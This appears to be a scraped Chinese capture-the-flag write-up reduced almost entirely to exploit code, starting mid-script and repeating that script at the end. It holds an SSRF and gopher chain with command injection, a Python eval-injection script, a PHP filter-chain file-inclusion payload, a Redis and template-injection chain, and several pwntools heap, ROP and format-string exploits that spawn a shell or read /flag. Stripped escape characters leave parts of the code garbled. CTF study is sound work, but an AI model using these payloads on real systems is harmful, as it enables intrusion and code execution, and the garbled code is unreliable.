add("aa")    dele()    dele()    dele()    dele()    set_idx(idx_addr,3)    edit(p64(libc_base+libc.sym['__free_hook']))    add("aa")    add(p64(libc_base+libc.sym['system']))    add("/bin/sh")    dele()     # debug()     p.interactive()if __name__ == '__main__':    exp()

往期回顾

对某微信小网站的逻辑漏洞挖掘

获取vCenter锁屏主机hash

Windows 权限提升


```
import urllibtest ="""POST /api.php?action=backup HTTP/1.1Host: 127.0.0.1:80Connection: closedContent-Type: application/json; charset=UTF-8Content-Length: 57 {"path":" -T --unzip-command='sh -c cat</flag|tee>flag'"}"""#注意后面一定要有回车，回车结尾表示http请求结束tmp = urllib.parse.quote(test)new = tmp.replace('%0A','%0D%0A')result = '_'+newprint(result) ##_POST%20/api.php%3Faction%3Dbackup%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%3A80%0D%0AConnection%3A%20closed%0D%0AContent-Type%3A%20application/json%3B%20charset%3DUTF-8%0D%0AContent-Length%3A%2057%0D%0A%0D%0A%7B%22path%22%3A%22%20-T%20--unzip-command%3D%27sh%20-c%20cat%3C/flag%7Ctee%3Eflag%27%22%7D%0D%0A
```



```
http://靶机ip/index.php?action=fetchPageInfo&url=http://127.0.0.1/api.php?action=batchDelete%26ids%5B1%5D=%2D3%3BUPDATE%2Bpages%2BSET%2Burl%2B%3D%2B%2522gopher%3A%2F%2F127%2E0%2E0%2E1%3A80%2F%5FPOST%252520/api.php%25253Faction%25253Dbackup%252520HTTP/1.1%25250D%25250AHost%25253A%252520127.0.0.1%25253A80%25250D%25250AConnection%25253A%252520closed%25250D%25250AContent-Type%25253A%252520application/json%25253B%252520charset%25253DUTF-8%25250D%25250AContent-Length%25253A%25252057%25250D%25250A%25250D%25250A%25257B%252522path%252522%25253A%252522%252520-T%252520--unzip-command%25253D%252527sh%252520-c%252520cat%25253C/flag%25257Ctee%25253Eflag%252527%252522%25257D%2522%2Bwhere%2Bid%3D8%3B%2D%2D
```



```
http://靶机ip/index.php?action=fetchPageInfo&url=http://靶机ip/index.php?action=click%26id=8
```



```
import osimport randomfrom flask import Flask, requestapp = Flask(__name__)app.config['SECRET_KEY'] = os.urandom(24)  class Login(object):    def __init__(self):        self.keyres = self.setkey()        self.results = self.decode(self.keyres)     def resdata(self):        return self.keyres, self.results     def decode(self, keyres):        chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz'        char_list = "".join([chars[random.randint(0, 61)] for _ in range(62)])        table = ''.maketrans(chars, char_list)        res = str(keyres).translate(table)        return res     def setkey(self):        key = ""        chars = '0123456789AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz'        for i in range(36):            key += chars[int(random.randrange(62))]        return key  @app.route("/")def index():    print("login", "keyres", keyres, "results", results)    return "welcome CTFer?! nonono, you are hacker!! come hack me?"  @app.route("/login")def login():    password = request.values.get("password")    if results is None or password is None:        return "give me your password! OR try request to url / OR try request to url /clear? "    short = min(len(results), len(password))    if password == results[0:short]:        return "WIN! "    else:        return "nonono! "  @app.route("/check")def check():    username = request.values.get("username")    hostname = request.headers.get("hostname")    if username is None or hostname is None:        return "give me your username and hostname!"    if username == results:        if hostname == "127.0.0.1":            userinfo = request.headers.get("username")            if userinfo is not None:                if userinfo.split("givemeflag")[0] == "admin":                    return eval("f'Hacker by %s ,my flag %s'" % (username, userinfo))                else:                    return "you dont admin!"            else:                return "you username?"        else:            return "you hostname?"    else:        return "you password?"  if __name__ == '__main__':    login = Login()    keyres, results = login.resdata()    app.run(host='0.0.0.0', port=8080, debug=False)
```



```
@app.route("/")、@app.route("/login")、@app.route("/check")
```



```
import requestsurl = "http://192.168.3.51:8080/"flag = ""requests.get(url=url,timeout=5)chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz'for i in range(0, 36):    for j in range(0, len(chars),1):        demo = flag + chars[j]        surl = url + "/login?password=" + demo        res = requests.get(url=surl)        if "WIN!" in res.text:            flag += chars[j]            print(flag)            breakheader={    "username":'admingivemeflag{os.popen("cat /flag").read()}',    "hostname":"127.0.0.1"}res=requests.get(url=url + "/check?username=" + flag,headers=header)print(res.text)
```



```
name=hhh44&birthdate=2024-06-29&id_number=+12345612346231212&college=%E7%BE%8E%E6%9C%AF%E5%AD%A6%E9%99%A2&major=%E8%A7%86%E8%A7%89%E4%BC%A0%E8%BE%BE%E8%AE%BE%E8%AE%A1&timestamp=&role=2&update=
```



```
2024-06-29美术学院 12345612346211231视觉传达设计llll21719651042145aa36a567b34212edc08d8ceada589
```



```
2024-06-29美术学院 12345612346211231视觉传达设计llll117196510423b472f818dcb2e5dbaf6fb3633340d2a
```



```
http://IP/admin.php?file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/etc/passwd&0=cat /etc/passwd
```



```
// 处理文件读取if (isset($_GET['file'])) {    $file = $_GET['file'];     // 第一个判断：开头4个字符是info    if (substr($file, 0, 4) !== 'info') {       echo "<script>alert('注意，不要进行攻击！！'); window.location = 'admin.php';</script>";        exit();    }     // 第二个判断：格式为xxxx/xxxx.txt    if (!preg_match('/^[a-zA-Z0-9_]+/[a-zA-Z0-9_]+.txt$/', $file)) {       echo "<script>alert('注意，不要进行攻击！！'); window.location = 'admin.php';</script>";        exit();    }     // 第三个判断：后缀是否是txt    $parts = explode('.', $file);    $extension = end($parts);    if ($extension !== 'txt') {       echo "<script>alert('注意，不要进行攻击！！'); window.location = 'admin.php';</script>";        exit();    }     // 第四个判断：过滤不安全的字符    $unsafe_patterns = array('php', 'input', 'base64', '../');    foreach ($unsafe_patterns as $pattern) {        if (stripos($file, $pattern) !== false) {            echo "<script>alert('包含不安全字符'); window.location = 'error.php';</script>";            exit();        }    }     // 安全通过，进行文件包含    include($file);    exit();}
```



```
<input type="hidden" name="timestamp" id="timestamp">                <input type="hidden" name="role" id="role" value=2>                <div class="form-buttons">
```



```
<input type="hidden" name="timestamp" id="timestamp">                <div class="form-buttons">
```



```
$major = json_decode('"' . $_POST['major'] . '"');        $role = $_POST['role'];//这个        $timestamp = $_SERVER['HTTP_TIMESTAMP'];        $sign = $_SERVER['HTTP_SIGN'];  // 从请求头中获取sign         $stringToHash = $birthdate . $college . $id_number . $major . $name . $role . $timestamp;//这个        $expectedSign = md5($stringToHash);        if ($sign !== $expectedSign) {            $message = '签名无效';        } else {            if (empty($name) || empty($birthdate) || empty($id_number) || empty($college) || empty($major)) {                $message = "所有字段都不能为空。";            } else {                if (strlen($id_number) == 18) {                    $stmt = $conn->prepare("UPDATE applications SET name=?, birthdate=?, idcard=?, college=?, major=? WHERE user_id=?");                    if ($stmt === false) {                        die('Prepare failed: ' . htmlspecialchars($conn->error));                    }                    $stmt->bind_param("sssssi", $name, $birthdate, $id_number, $college, $major, $user_id);                    if ($stmt->execute()) {                        // 更新users表中的account和role                        $stmt_users = $conn->prepare("UPDATE users SET account=?, role=? WHERE id=?");//这个                        if ($stmt_users === false) {                            die('Prepare failed: ' . htmlspecialchars($conn->error));                        }                        $stmt_users->bind_param("sii", $name, $role, $user_id);//这个
```



```
$major = json_decode('"' . $_POST['major'] . '"');        $timestamp = $_SERVER['HTTP_TIMESTAMP'];        $sign = $_SERVER['HTTP_SIGN'];  // 从请求头中获取sign         $stringToHash = $birthdate . $college . $id_number . $major . $name  . $timestamp;//这个        $expectedSign = md5($stringToHash);        if ($sign !== $expectedSign) {            $message = '签名无效';        } else {            if (empty($name) || empty($birthdate) || empty($id_number) || empty($college) || empty($major)) {                $message = "所有字段都不能为空。";            } else {                if (strlen($id_number) == 18) {                    $stmt = $conn->prepare("UPDATE applications SET name=?, birthdate=?, idcard=?, college=?, major=? WHERE user_id=?");                    if ($stmt === false) {                        die('Prepare failed: ' . htmlspecialchars($conn->error));                    }                    $stmt->bind_param("sssssi", $name, $birthdate, $id_number, $college, $major, $user_id);                    if ($stmt->execute()) {                        // 更新users表中的account和role                        $stmt_users = $conn->prepare("UPDATE users SET account=? WHERE id=?");//这个                        if ($stmt_users === false) {                            die('Prepare failed: ' . htmlspecialchars($conn->error));                        }                        $stmt_users->bind_param("sii", $name, $user_id);//这个
```



```
$major = json_decode('"' . $_POST['major'] . '"');        $timestamp = $_SERVER['HTTP_TIMESTAMP'];        $sign = $_SERVER['HTTP_SIGN'];  // 从请求头中获取sign         $stringToHash = $birthdate . $college . $id_number . $major . $name  . $timestamp;//这个        $expectedSign = md5($stringToHash);        if ($sign !== $expectedSign) {            $message = '签名无效';        } else {            if (empty($name) || empty($birthdate) || empty($id_number) || empty($college) || empty($major)) {                $message = "所有字段都不能为空。";            } else {                if (strlen($id_number) == 18) {                    $stmt = $conn->prepare("UPDATE applications SET name=?, birthdate=?, idcard=?, college=?, major=? WHERE user_id=?");                    if ($stmt === false) {                        die('Prepare failed: ' . htmlspecialchars($conn->error));                    }                    $stmt->bind_param("sssssi", $name, $birthdate, $id_number, $college, $major, $user_id);                    if ($stmt->execute()) {                        // 更新users表中的account和role                        $stmt_users = $conn->prepare("UPDATE users SET account=? WHERE id=?");//这个                        if ($stmt_users === false) {                            die('Prepare failed: ' . htmlspecialchars($conn->error));                        }                        $stmt_users->bind_param("sii", $name, $user_id);//这个
```



```
function generateSign(event, actionType) {            const form = document.getElementById('updateForm');            const formData = new FormData(form);            const timestamp = Math.floor(Date.now() / 1000);             const params = {                birthdate: formData.get('birthdate'),                college: formData.get('college'),                id_number: formData.get('id_number'),                major: formData.get('major'),                name: formData.get('name'),                role: formData.get('role'),//这个                timestamp: timestamp            };
```



```
function generateSign(event, actionType) {            const form = document.getElementById('updateForm');            const formData = new FormData(form);            const timestamp = Math.floor(Date.now() / 1000);             const params = {                birthdate: formData.get('birthdate'),                college: formData.get('college'),                id_number: formData.get('id_number'),                major: formData.get('major'),                name: formData.get('name'),                timestamp: timestamp            };
```



```
http://127.0.0.1:5000/view_book?filename=app.py
```



```
def pack_command(*args):    # 构建 RESP 请求    command = f"*{len(args)}rn"    for arg in args:        arg_str = str(arg)        command += f"${len(arg_str)}rn{arg_str}rn"    return command.encode('utf-8')  random_string = ''.join(random.choices(string.digits, k=10)) user_admin = f"user:{random_string}"user_info = {'passw0rd': "expexp", 'r0le': "adm1n"}user_info_serialized = base64.b64encode(pickle.dumps(user_info)).decode()payload = "rn$1rn1rnrn"payload += pack_command('SET', user_admin, user_info_serialized).decode() + "rnrn"escape_string = ""for i in payload:    escape_string += "adm1n"final_payload = escape_string + payloaddata = {"username": final_payload, "password": "123"}r = requests.post(exp_url, data=data)
```



```
import pickleimport randomimport string import requestsimport base64from urllib.parse import quote # 测试题目链接exp_url = "http://127.0.0.1:5000"  def pack_command(*args):    # 构建 RESP 请求    command = f"*{len(args)}rn"    for arg in args:        arg_str = str(arg)        command += f"${len(arg_str)}rn{arg_str}rn"    return command.encode('utf-8')  random_string = ''.join(random.choices(string.digits, k=10)) user_admin = f"user:{random_string}"user_info = {'passw0rd': "expexp", 'r0le': "adm1n"}user_info_serialized = base64.b64encode(pickle.dumps(user_info)).decode()payload = "rn$1rn1rnrn"payload += pack_command('SET', user_admin, user_info_serialized).decode() + "rnrn"escape_string = ""for i in payload:    escape_string += "adm1n"final_payload = escape_string + payloaddata = {"username": final_payload, "password": "123"}r = requests.post(exp_url, data=data)if r.status_code == 200:    s = requests.session()    data = {"username": random_string, "password": "expexp"}    r = s.post(exp_url, data=data)    book_rce_data = {"title": "../templates/index.html", "author": "{{application.__init__.__globals__.__builtins__['__import__']('os').popen('cat /flag').read()}}","description":"1","content":"2"}    post_url = exp_url+ "/add_book"    r1 = s.post(post_url, data=book_rce_data)    r2 = s.get(exp_url)    if "flag" in r2.text:        print("exp success")
```



```
from pwn import * context(os='linux', arch='amd64')def s(a):    io.send(a)def sa(a, b):    io.sendafter(a, b)def sl(a):    io.sendline(a)def sla(a, b):    io.sendlineafter(a, b)def r(a):    return io.recv(a)def ru(a):    return io.recvuntil(a)def inter():    io.interactive()def debug():    gdb.attach(io)    pause()def get_addr():    return u64(io.recvuntil(b'x7f')[-6:].ljust(8, b'x00'))io = process('./account')# io = remote('0.0.0.0', 9999)elf = ELF('./account')libc = ELF("./libc.so.6")def add(size):    sla(b"choice: n", b'1')    sla(b"account:n", str(size).encode())def free(index):    sla(b"choice: n", b'2')    sla(b"account:n", str(index).encode())def deposit(index, data):    sla(b"choice: n", b'3')    sla(b"account:n", str(index).encode())    sa(b"deposit:n", data)def remove(index, data):    sla(b"choice: n", b'4')    sla(b"account:n", str(index).encode())    sa(b"itn", data)def show(index):    sla(b"choice: n", b'5')    sla(b"account:n", str(index).encode())sla(b"name:n", b'a')# leak libc_baseadd(0x410)  # 0add(0x1f0)  # 1add(0x1f0)  # 2free(0)add(0x1f0)  # 0show(0)libc_base = get_addr() - 0x1ecfd0environ = libc_base + libc.sym["environ"]success("libc_base: " + hex(libc_base))success("environ: " + hex(environ))free(2)remove(1, b'2272')add(0x1f0)  # 1add(0x1f0)  # 2 -> tcache_structdeposit(2, p16(1) * 16 + p64(0) * 26 + p64(environ))add(0xf0)  # 3show(3)stack_addr = get_addr() - 0x120success("stack_addr: " + hex(stack_addr))deposit(2, p16(1) * 16 + p64(0) * 26 + p64(stack_addr))pop_rax = libc_base + next(libc.search(asm('pop rax;ret')))pop_rdi = libc_base + next(libc.search(asm('pop rdi;ret')))pop_rsi = libc_base + next(libc.search(asm('pop rsi;ret')))pop_rdx = libc_base + next(libc.search(asm('pop rdx; pop r12; ret'), executable=True))syscall = libc_base + next(libc.search(asm('syscall;ret')))ret = libc_base + next(libc.search(asm('ret')))success("syscall: " + hex(syscall))orw = p64(pop_rax) + p64(2)orw += p64(pop_rdi) + p64(stack_addr + 0xb0)orw += p64(pop_rsi) + p64(0)orw += p64(syscall)orw += p64(pop_rax) + p64(0)orw += p64(pop_rdi) + p64(3)orw += p64(pop_rsi) + p64(stack_addr + 0x100)orw += p64(pop_rdx) + p64(0x50) + p64(0)orw += p64(syscall)orw += p64(pop_rax) + p64(1)orw += p64(pop_rdi) + p64(1)orw += p64(syscall)orw += b'./flagx00x00'add(0xf0)  # 4deposit(4, orw) io.interactive()
```



```
from pwn import *from ctypes import cdll context(os='linux', arch='amd64', log_level='debug')def s(a):    io.send(a)def sa(a, b):    io.sendafter(a, b)def sl(a):    io.sendline(a)def sla(a, b):    io.sendlineafter(a, b)def r(a):    return io.recv(a)def ru(a):    return io.recvuntil(a)def inter():    io.interactive()def debug():    gdb.attach(io)    pause()def get_addr():    return u64(io.recvuntil(b'x7f')[-6:].ljust(8, b'x00'))io = process('./alarm')# io = remote('0.0.0.0', 9999)elf = ELF('./alarm')libc = ELF("./libc.so.6")libcc = cdll.LoadLibrary('./libc.so.6')libcc.srand(0x39)for i in range(3):    num = libcc.rand() % 40 + 61    s(str(num).encode())    sleep(1)read = elf.plt['read']alarm = elf.got['alarm']pop_rdi = 0x4014a3pop_rsi_r15 = 0x4014a1pop_rax = 0x401308csu_1 = 0x40149Acsu_2 = 0x401480vuln = 0x40130Dbss = elf.bss(0x100)#read ./flag into bsspayload1 = b'a' * 0x48 + p64(pop_rsi_r15) + p64(bss) + p64(0) + p64(read) + p64(vuln)sl(payload1)sleep(0.5)sl(b'./flagx00x00')#change alarm@got to syscallpayload2 = b'a' * 0x48 + p64(pop_rsi_r15) + p64(alarm) + p64(0) + p64(read)#openpayload2 += p64(pop_rax) + p64(2)payload2 += p64(csu_1) + p64(0) + p64(1) + p64(bss) + p64(0) + p64(0) + p64(alarm) + p64(csu_2)payload2 += b'a' * 0x38#read:payload2 += p64(pop_rax) + p64(0)payload2 += p64(csu_1) + p64(0) + p64(1) + p64(3) + p64(bss + 0x100) + p64(0x50) + p64(alarm) + p64(csu_2)payload2 += b'a' * 0x38#write:payload2 += p64(pop_rax) + p64(1)payload2 += p64(csu_1) + p64(0) + p64(1) + p64(1) + p64(bss + 0x100) + p64(0x50) + p64(alarm) + p64(csu_2)sl(payload2)sleep(1)s(b'x99')sleep(1) io.interactive()
```



```
from pwn import * context(os='linux', arch='amd64', log_level='debug')def s(a):    io.send(a)def sa(a, b):    io.sendafter(a, b)def sl(a):    io.sendline(a)def sla(a, b):    io.sendlineafter(a, b)def r(a):    return io.recv(a)def ru(a):    return io.recvuntil(a)def inter():    io.interactive()def debug():    gdb.attach(io)    pause()def get_addr():    return u64(io.recvuntil(b'x7f')[-6:].ljust(8, b'x00'))io = process('./pwn')elf = ELF('./pwn')libc = ELF('./libc.so.6')# leak random_addrpayload1 = b"%llx%llx%llx%llx%llx%llx_%llx*"io.recvuntil(b"name?n")sl(payload1)data = io.recvuntil(b"*")[:-1]underscore_index = data.index(b'_')pro_base = int(data[:underscore_index][-12:], 16) - 0x11a0stack_addr = int(data[underscore_index + 1:], 16)random_addr = stack_addr + 0x470#leak randompayload2 = b"%llx" * 18 + b"%llx" + b"_%s*" + p64(random_addr)io.recvuntil(b'else to say?n')sl(payload2)io.recvuntil(b'_')random = int(io.recv(9), 10)sa(b"integersn", str(random))#ret2libcputs_plt = pro_base + elf.plt["puts"]puts_got = pro_base + elf.got["puts"]pop_rdi = pro_base + 0x1583ret = pro_base + 0x101avuln = pro_base + 0x140fpayload = b'a' * 0x48 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln)sla(b"giftn", payload)puts_addr = get_addr()libc_base = puts_addr - libc.sym["puts"]system = libc_base + libc.sym["system"]binsh = libc_base + next(libc.search(b'/bin/shx00'))success("libc_base: " + hex(libc_base))success("system: " + hex(system))payload2 = payload = b'a' * 0x48 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)sla(b"giftn", payload2) io.interactive()
```



```
def set_idx(idx_addr,idx):        add(f"%{idx_addr&0xffff}c%11$hn")        show()        add(f"%{idx}c%39$hnn")        show()
```



```
from pwn import *# from LibcSearcher import *context.terminal = ['tmux','splitw','-h']context.log_level=Truecontext.arch='amd64'elf_path = './just_a_heap'debug = 1libc_path = './libc-2.31.so'if debug:    # p = process(elf_path)    # p = process([elf_path,ld_path],env={'LD_PRELOAD':libc_path})    p = process(elf_path,env={'LD_PRELOAD':libc_path})    # p = process([libc_path,elf_path])else:    remote_addr = '127.0.0.1:9999'    remote_addr = remote_addr.split(':')    remote_addr[1] = eval(remote_addr[1])    p=remote(remote_addr[0],remote_addr[1]) libc = ELF(libc_path)elf = ELF(elf_path)ru = lambda x : p.recvuntil(x)sn = lambda x : p.send(x)rl = lambda   : p.recvline()sl = lambda x : p.sendline(x)rv = lambda x : p.recv(x)sa = lambda a,b : p.sendafter(a,b)sla = lambda a,b : p.sendlineafter(a,b)def debug():    gdb.attach(p)    pause()def lg(s,addr = None):    if addr:        print(' 33[1;31;40m[+]  %-15s  --> 0x%8x 33[0m'%(s,addr))    else:        print(' 33[1;32;40m[-]  %-20s  33[0m'%(s))def add(data):    sla('Enter your choice: ','1')    sa("Your data: ",data)def dele():    sla('Enter your choice: ','2')def edit(data):    sla('Enter your choice: ','3')    sa("New data: ",data)def show():    sla('Enter your choice: ','4')def eixt():    sla('Enter your choice: ','5')def change(idx,data):    add(f"%{0xed40+idx*2}c%13$hn")    show()    add(f"%{data}c%41$hn")    show()def exp():    add(f"%11$p-%9$p")    show()    stack_addr = int(ru('-')[:-1],16)    libc_addr = int(ru('n')[:-1],16)    libc_base = libc_addr - 0x24083    idx_addr = stack_addr - (0xee48-0xed44)    lg("libc_addr",libc_addr)    lg("libc_base",libc_base)    lg("idx_addr",idx_addr)    def set_idx(idx_addr,idx):        add(f"%{idx_addr&0xffff}c%11$hn")        show()        add(f"%{idx}c%39$hnn")        show()    add("aa")    add("aa")    add("aa")    dele()    dele()    dele()    dele()    set_idx(idx_addr,3)    edit(p64(libc_base+libc.sym['__free_hook']))    add("aa")    add(p64(libc_base+libc.sym['system']))    add("/bin/sh")    dele()     # debug()     p.interactive()if __name__ == '__main__':    exp()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/10-1721988833.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/7-1721988846.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/9-1721988847.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/1-1721988847.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/6-1721988848.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/3-1721988848.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/0-1721988849.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/0-1721988850.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/6-1721988850.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/1-1721988851.png)